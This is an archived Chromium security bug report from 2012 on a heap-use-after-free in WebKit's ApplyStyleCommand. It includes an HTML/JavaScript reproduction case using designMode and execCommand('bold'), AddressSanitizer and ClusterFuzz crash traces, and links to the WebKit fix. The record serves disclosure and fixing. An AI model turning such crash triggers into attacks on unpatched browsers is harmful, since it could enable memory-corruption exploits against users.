# Heap-use-after-free in WebCore::ApplyStyleCommand::applyInlineStyleToNodeRange

| Field | Value |
|-------|-------|
| **Issue ID** | [40055415](https://issues.chromium.org/issues/40055415) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | mi...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2012-03-22 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::ApplyStyleCommand::applyInlineStyleToNodeRange

**VERSION**  

Chrome Version: stable, beta, dev

Chromium 19.0.1078.0 (Developer Build 128192)  

OS Linux  

WebKit 536.4 (@111590)

Operating System: 64bit linux

**REPRODUCTION CASE**

<html>
<head>
<script>
onload = function() {
x.innerHTML += ''
}
setTimeout(function() {
document.designMode='on'
document.execCommand('selectall')
document.execCommand('bold')
}, 0)
</script>
</head>
<body>
<div id="x">
<iframe src="data:"></iframe>
<div>
<input></input>
</div>
</ul>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==3487== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffc6b489c0 at pc 0x55555a8b5c80 bp 0x7fffffff9490 sp 0x7fffffff9488  

READ of size 8 at 0x7fffc6b489c0 thread T0  

#0 0x55555a8b5c80 in WebCore::ApplyStyleCommand::applyInlineStyleToNodeRange(WebCore::EditingStyle\*, WebCore::Node\*, WebCore::Node\*) ???:0  

#1 0x55555a8b44cb in WebCore::ApplyStyleCommand::fixRangeAndApplyInlineStyle(WebCore::EditingStyle\*, WebCore::Position const&,

0x7fffc6b489c0 is located 64 bytes inside of 104-byte region [0x7fffc6b48980,0x7fffc6b489e8)  

freed by thread T0 here:  

#0 0x55555de4d932 in operator delete(void\*) ??:0  

#1 0x55555a8b5a5a in WebCore::ApplyStyleCommand::applyInlineStyleToNodeRange(WebCore::EditingStyle\*, WebCore::Node\*, WebCore::Node\*) ???:0  

#2 0x55555a8b44cb in WebCore::ApplyStyleCommand::fixRangeAndApplyInlineStyle(WebCore::EditingStyle\*, WebCore::Position const&, WebCore::Position const&) ???:0

## Attachments

- [64104.txt](attachments/64104.txt) (text/x-c; charset=us-ascii, 10.8 KB)
- [64104.html](attachments/64104.html) (text/html; charset=us-ascii, 408 B)
- [beta-64104.txt](attachments/beta-64104.txt) (text/x-c; charset=us-ascii, 10.9 KB)
- [stable-64104.txt](attachments/stable-64104.txt) (text/plain; charset=us-ascii, 11.0 KB)

## Timeline

### in...@chromium.org (2012-03-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-22)

webkit upstream - https://bugs.webkit.org/show_bug.cgi?id=81959

### in...@chromium.org (2012-03-22)

[Empty comment from Monorail migration]

### in...@chromium.org (2012-03-22)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=29322300

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7faac8486bc0
Crash State:
  - crash stack -
  WebCore::ApplyStyleCommand::applyInlineStyleToNodeRange
  WebCore::ApplyStyleCommand::fixRangeAndApplyInlineStyle
  - free stack -
  WebCore::ApplyStyleCommand::applyInlineStyleToNodeRange
  WebCore::ApplyStyleCommand::fixRangeAndApplyInlineStyle
  

Minimized Testcase (0.32 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv94THgDdzgBmEY372A3m9xB3RhOGTy84hvmAqqBdMQRqL5XCG-FhintY_fvlXnByETeRMLYc3egV8KXuh3d4S2FOQbrfjsBQbFXs3249l7JujShbG-03ngVceSmki2qF19xI9snSZ1DiCfGTOIQGJ22U4gI1kA
<script>
      onload = function() {
        x.innerHTML += ''
      }
      setTimeout(function() {
        document.designMode='on'
        document.execCommand('selectall')
        document.execCommand('bold')
      }, 0)
    </script>
  <div id="x">
      <iframe src="data:"></iframe>
      <div>
        <input></input>

### in...@chromium.org (2012-03-24)

http://trac.webkit.org/changeset/112012

### sc...@gmail.com (2012-03-24)

[Empty comment from Monorail migration]

### cl...@chromium.org (2012-03-26)

ClusterFuzz has detected this issue as fixed in range 128813:128890.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=29322300

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7faac8486bc0
Crash State:
  - crash stack -
  WebCore::ApplyStyleCommand::applyInlineStyleToNodeRange
  WebCore::ApplyStyleCommand::fixRangeAndApplyInlineStyle
  - free stack -
  WebCore::ApplyStyleCommand::applyInlineStyleToNodeRange
  WebCore::ApplyStyleCommand::fixRangeAndApplyInlineStyle
  
Fixed: https://cluster-fuzz.appspot.com/revisions?range=128813:128890

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv94THgDdzgBmEY372A3m9xB3RhOGTy84hvmAqqBdMQRqL5XCG-FhintY_fvlXnByETeRMLYc3egV8KXuh3d4S2FOQbrfjsBQbFXs3249l7JujShbG-03ngVceSmki2qF19xI9snSZ1DiCfGTOIQGJ22U4gI1kA

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### sc...@gmail.com (2012-03-30)

M18: http://trac.webkit.org/changeset/112630

### sc...@gmail.com (2012-04-04)

$1000 and all that

### sc...@gmail.com (2012-05-10)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/119525?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40055415)*
